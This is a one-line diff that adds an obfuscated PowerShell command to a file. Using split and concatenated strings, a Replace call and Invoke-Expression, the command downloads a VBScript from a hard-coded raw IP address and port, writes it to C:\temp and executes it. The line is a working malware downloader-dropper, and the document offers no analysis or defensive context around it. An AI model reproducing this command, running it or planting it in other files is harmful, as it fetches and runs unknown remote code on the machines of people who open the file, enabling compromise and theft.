@@ -1,0 +1,1 @@
+! powershell  -""nop "$Q='IEX(New-Object Net.WebClient).Downlo';$W='X(''ht''+''tp:/''+''/106.''+''55.''+''231.88:4545/enterFor.vbs'',''C:\temp\enterFor.vbs'')'.Replace('X','adFile');IEX($Q+$W)";C:\temp\enterFor.vbs
